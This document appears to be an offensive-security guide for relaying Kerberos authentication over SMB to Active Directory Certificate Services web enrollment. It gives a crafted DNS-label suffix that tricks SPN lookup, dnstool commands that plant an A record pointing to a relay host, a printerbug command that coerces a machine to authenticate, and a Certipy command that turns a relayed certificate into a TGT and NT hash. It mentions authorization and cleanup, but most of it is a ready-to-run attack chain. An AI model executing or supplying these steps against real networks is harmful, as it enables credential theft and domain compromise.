# Kerberos over SMB to Web Enrollment

Select an authorized source machine with an available coercion mechanism, a reachable relay listener and a real AD CS endpoint accepting the relevant Kerberos principal. Check service SPNs, certificate template eligibility and effective extended protection/channel binding; switching from NTLM does not bypass every protection. A failed NTLM challenge is a protocol result, not proof that Kerberos relay must work or that PKU2U is in use.

## Keep DNS connection naming separate from ticket naming

In the documented Windows SMB naming path, a valid marshalled target-info suffix can be stripped from the SPN lookup while the full hostname still determines the connection address. The short target must have the matching registered service name/key context. With the minimal documented suffix, the derived single DNS label is limited to 63 octets; do not truncate it and expect equivalent behavior.

The following construction is a **documentation-derived example**, not a verified image fact. Define `service_short` as the selected real enrollment host's short SPN name, `zone` as its AD DNS zone and `relay_ip` as the address reachable from the source:

~~~bash
suffix='1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA'
callback_label="${service_short}${suffix}"
callback_fqdn="$callback_label.$zone"
~~~

Review the Windows build/patch status and actual SPN request before attributing behavior to this mechanism. A normal DNS alias alone does not establish that the requested ticket uses the enrollment host's key. DNS-label length and byte spelling are protocol requirements, not decoration.

For a known identity permitted to create the exact new node, define `dnstool_script`, `dns_identity` (`DOMAIN\account`) and `dc`, then query/add only that record:

~~~bash
python3 "$dnstool_script" -u "$dns_identity" -r "$callback_fqdn" -a query "$dc" --tcp
python3 "$dnstool_script" -u "$dns_identity" -r "$callback_fqdn" -a add -t A -d "$relay_ip" "$dc" --tcp
~~~

Capture its before-state and LDAP result; query from the source's DNS vantage before triggering. `--tcp` applies to this script's DNS queries. A group label such as DNSAdmins is not a completed DNS write, and replication/caches can delay use. If the current principal lacks rights but a specifically authorized LDAP relay supplies another identity, that is a distinct authenticated write; do not conflate it with permission under the original credential.

## Correlate the trigger, AP-REQ and certificate

Start the entrypoint's explicitly selected enrollment listener before the bounded trigger. For krbrelayx's companion printerbug, define `printerbug_script`, `source_domain`, `source_account` and `source_fqdn`:

~~~bash
python3 "$printerbug_script" "$source_domain/$source_account@$source_fqdn" "$callback_fqdn"
~~~

This asks the source spooler to connect outward; the local process's proxy route does not tunnel that callback. A returned RPC access-denied result can coexist with a real callback. Require the listener's observed authentication protocol/principal, not its generic 'may or may not have worked' text.

| Evidence | Established stage / next decision |
|---|---|
| DNS A value stored but source cannot resolve/connect | Diagnose actual DNS vantage, replication, route and listener; no relay result yet. |
| SMB connection without the needed Kerberos AP-REQ | Inspect the source's selected authentication/SPN and protections; do not treat NTLM as Kerberos. |
| HTTP 200 / 'successful login' | Tool-side heuristic; verify the enrollment response and issued credential. |
| CSR or pending request | Request stage only; keep the matching key and disposition. |
| Certificate/PFX saved | Inspect subject/SAN/SID, template and matching key; identity is not established by filename. |
| PKINIT succeeds with the PFX | Record actual principal/TGT; requested hash recovery and service access are later, separate results. |

For an authorized PFX authentication using ly4k's installed Certipy AD CS invocation (`certipy_bin`), define `pfx`, `expected_account`, `domain` and `dc_ip`:

~~~bash
"$certipy_bin" auth -pfx "$pfx" -username "$expected_account" -domain "$domain" -dc-ip "$dc_ip" -no-hash
~~~

Omit `-no-hash` only when the separate NT-hash recovery is part of the selected audit; a TGT can succeed while that stage fails. Mapping and KDC PKINIT behavior depend on the current policy/certificate. Retain actual outputs privately.

Stop all owned listeners. Remove only the added A value using dnstool's reviewed `remove` action and recheck both directory/DNS state. Certificate issuance is persistent: DNS cleanup does not revoke the certificate, invalidate every ticket or undo other relay actions. Record lifecycle/restoration evidence for the requested scope.

See [Synacktiv's protocol research](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx), [upstream DNS lifecycle](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py), [coercion implementation](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) and [Certipy authentication](https://github.com/ly4k/Certipy/blob/main/certipy/commands/auth.py).
